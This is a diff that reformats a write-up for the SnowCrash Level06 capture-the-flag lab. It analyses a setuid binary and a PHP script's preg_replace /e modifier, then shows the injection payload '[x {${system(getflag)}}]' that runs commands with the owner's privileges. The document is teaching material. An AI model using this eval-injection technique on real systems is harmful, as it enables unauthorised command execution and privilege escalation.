@@ -1,4 +1,8 @@
-Listing the files in the directory, we find a binary file and a php script:
+# Level06
+
+## Walkthrough
+
+Listing the files in the directory, we find a binary file and a php script.
 
 ```bash
 level06@SnowCrash:~$ ls -la
@@ -6,26 +10,26 @@ level06@SnowCrash:~$ ls -la
 -rwxr-x--- 1 flag06 level06 356 Mar 5  2015 level06.php
 ```
 
-The s in level06 permissions indicates the SetUID bit. This means the file will run with the privileges of its owner instead of the user executing it. In our case, the owner is flag06.
+The `s` in `level06` permissions indicates the **setuid** bit. This means the file will run with the privileges of its owner instead of the user executing it. In our case, the owner is **flag06**.
 
-### **Analyzing level06 binary file**
+### Analyzing level06 binary file
 
 ```bash
 level06@SnowCrash:~$ file level06
 level06: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs)
 ```
 
-To analyze the binary file, we transfer it to our local machine using **scp**:
+To analyze the binary file, we transfer it to our local machine using **SCP**.
 
 ```bash
 level06@SnowCrash:~$ scp -P 4242 level06@127.0.0.1:/home/user/level06/level06 ./
 ```
 
-We decompile the binary using [dogbolt.org](http://dogbolt.org) 
+We decompile the binary using **dogbolt**.
 
-The script calls **getegid()** and **geteuid()** to retrieve the effective group ID and user ID, and then uses **setresgid()** and **setresuid()** to set them. In our case, these correspond to the **flag06** IDs.
+The script calls `getegid()` and `geteuid()` to retrieve the effective group ID and user ID, and then uses `setresgid()` and `setresuid()` to set them. In our case, these correspond to the **flag06** IDs.
 
-### **Analyzing level06.php**
+### Analyzing level06.php
 
 ```php
 #!/usr/bin/php
@@ -49,36 +53,32 @@ print $r;
 ?>
 ```
 
-**The y() function**
+#### The y() function
 
 Input: 
-
 - $m → a string
 
 Behavior: 
+- replaces . by “ x ” in $m
+- replaces @ by “ y” in $m
 
-- Replace . by “ x ” in $m
-- Replace @ by “ y” in $m
+Returns $m.
 
-Return $m
-
-**The x() function**
+#### The x() function
 
 Input : 
-
 - $y → a path to a file
 - $z → unused
 
 Behavior:
+- gets the content of the file and stores it in $a
+- replaces [ by ( in $a
+- replaces ] by ) in $a
+- replaces [x something] with the result of y(”something”)
 
-- Get the content of the file and stores it in $a
-- Replace [ by ( in $a
-- Replace ] by ) in $a
-- Replaces [x something] with the result of y(”something”)
+Returns $a.
 
-Return $a
-
-**Regex explanations**
+#### Regex explanations
 
 | PHP | Meaning |
 | --- | --- |
@@ -89,7 +89,7 @@ Return $a
 | preg_replace("/\]/", ")", $a) | Replace ] by ) in $a |
 | preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a) | Replaces [x something] with the result of y(”something”) |
 
-Detailed explanation of **preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)** : 
+#### Detailed explanation of `preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a)`
 
 | Regex | Meaning |
 | --- | --- |
@@ -120,7 +120,7 @@ level06@SnowCrash:~$ chmod 777 /tmp/my_dir/script
 level06@SnowCrash:~$ echo '[x {${system(getflag)}}]' > script
 ```
 
-Running the script:
+We run the script.
 
 ```bash
 level06@SnowCrash:~$ ./level06 script
